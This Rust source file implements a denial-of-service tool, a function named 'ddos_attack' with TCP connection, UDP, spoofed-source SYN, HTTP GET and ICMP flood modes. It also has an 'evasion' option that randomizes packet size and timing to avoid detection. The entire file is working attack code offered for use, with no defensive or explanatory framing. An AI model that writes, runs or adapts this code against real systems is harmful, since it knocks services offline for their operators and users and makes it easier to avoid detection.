use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::{Packet, MutablePacket};
use pnet::transport::{transport_channel, TransportChannelType};
use pnet::util::checksum;
use tokio::net::{TcpStream, UdpSocket};
use tokio::io::AsyncWriteExt;
use std::time::Duration;
use tokio::time::Instant;

pub async fn ddos_attack(attack_type: String, target: String, port: u16, duration: u64, evasion: bool) {
    let end = Instant::now() + Duration::from_secs(duration);
    let junk = vec![0u8; 1024];

    match attack_type.as_str() {
        "tcp" => {
            while Instant::now() < end {
                let junk = if evasion { vec![0u8; rand::random::<usize>() % 1024 + 1] } else { vec![0u8; 1024] };
                if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
                    let _ = stream.write_all(&junk).await;
                }
                if evasion {
                    tokio::time::sleep(Duration::from_millis(rand::random::<u64>() % 100)).await;
                }
                tokio::task::yield_now().await;
            }
        }
        "udp" => {
            if let Ok(socket) = UdpSocket::bind("0.0.0.0:0").await {
                let addr = format!("{}:{}", target, port);
                while Instant::now() < end {
                    let _ = socket.send_to(&junk, &addr).await;
                    tokio::task::yield_now().await;
                }
            }
        }
        "syn" => {
            // SYN flood using raw packets
            if let Ok((mut tx, _)) = transport_channel(4096, TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp)) {
                while Instant::now() < end {
                    let mut ip_buffer = [0u8; 20 + 20]; // IP + TCP headers
                    let mut ipv4_packet = MutableIpv4Packet::new(&mut ip_buffer).unwrap();
                    
                    // Random source IP (spoofing)
                    let src_ip = std::net::Ipv4Addr::new(
                        rand::random::<u8>(),
                        rand::random::<u8>(),
                        rand::random::<u8>(),
                        rand::random::<u8>(),
                    );
                    let dst_ip: std::net::Ipv4Addr = target.parse().unwrap_or(std::net::Ipv4Addr::new(127, 0, 0, 1));
                    
                    ipv4_packet.set_version(4);
                    ipv4_packet.set_header_length(5);
                    ipv4_packet.set_total_length(40);
                    ipv4_packet.set_ttl(64);
                    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
                    ipv4_packet.set_source(src_ip);
                    ipv4_packet.set_destination(dst_ip);
                    ipv4_packet.set_checksum(checksum(ipv4_packet.packet(), 1));
                    
                    let tcp_payload = ipv4_packet.payload_mut();
                    let mut tcp_packet = MutableTcpPacket::new(tcp_payload).unwrap();
                    
                    tcp_packet.set_source(rand::random::<u16>());
                    tcp_packet.set_destination(port);
                    tcp_packet.set_sequence(rand::random());
                    tcp_packet.set_acknowledgement(0);
                    tcp_packet.set_data_offset(5);
                    tcp_packet.set_flags(TcpFlags::SYN);
                    tcp_packet.set_window(1024);
                    tcp_packet.set_urgent_ptr(0);
                    tcp_packet.set_checksum(0); // Checksum calculation complex, skip for flood
                    
                    let _ = tx.send_to(ipv4_packet, dst_ip.into());
                    tokio::task::yield_now().await;
                }
            } else {
                // Fallback to TCP
                while Instant::now() < end {
                    if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
                        let _ = stream.write_all(&junk).await;
                    }
                    tokio::task::yield_now().await;
                }
            }
        }
        "http" => {
            // HTTP GET flood
            let client = reqwest::Client::new();
            let url = if target.starts_with("http") {
                target.clone()
            } else {
                format!("http://{}", target)
            };
            while Instant::now() < end {
                let _ = client.get(&url).send().await;
                tokio::task::yield_now().await;
            }
        }
        "icmp" => {
            // ICMP echo flood (ping flood)
            if let Ok((mut tx, _)) = transport_channel(4096, TransportChannelType::Layer3(IpNextHeaderProtocols::Icmp)) {
                while Instant::now() < end {
                    let mut ip_buffer = [0u8; 20 + 8]; // IP + ICMP headers
                    let mut ipv4_packet = MutableIpv4Packet::new(&mut ip_buffer).unwrap();
                    
                    let src_ip = std::net::Ipv4Addr::new(
                        rand::random::<u8>(),
                        rand::random::<u8>(),
                        rand::random::<u8>(),
                        rand::random::<u8>(),
                    );
                    let dst_ip: std::net::Ipv4Addr = target.parse().unwrap_or(std::net::Ipv4Addr::new(127, 0, 0, 1));
                    
                    ipv4_packet.set_version(4);
                    ipv4_packet.set_header_length(5);
                    ipv4_packet.set_total_length(28);
                    ipv4_packet.set_ttl(64);
                    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
                    ipv4_packet.set_source(src_ip);
                    ipv4_packet.set_destination(dst_ip);
                    ipv4_packet.set_checksum(checksum(ipv4_packet.packet(), 1));
                    
                    let icmp_payload = ipv4_packet.payload_mut();
                    icmp_payload[0] = 8; // Echo request
                    icmp_payload[1] = 0; // Code
                    icmp_payload[2] = 0; // Checksum high
                    icmp_payload[3] = 0; // Checksum low
                    let id = rand::random::<u16>();
                    let seq = rand::random::<u16>();
                    icmp_payload[4] = (id >> 8) as u8;
                    icmp_payload[5] = id as u8;
                    icmp_payload[6] = (seq >> 8) as u8;
                    icmp_payload[7] = seq as u8;
                    // Rest is data, leave as 0
                    
                    let _ = tx.send_to(ipv4_packet, dst_ip.into());
                    tokio::task::yield_now().await;
                }
            } else {
                // Fallback to TCP
                while Instant::now() < end {
                    if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
                        let _ = stream.write_all(&junk).await;
                    }
                    tokio::task::yield_now().await;
                }
            }
        }
        _ => {
            // Default to TCP
            while Instant::now() < end {
                if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
                    let _ = stream.write_all(&junk).await;
                }
                tokio::task::yield_now().await;
            }
        }
    }
}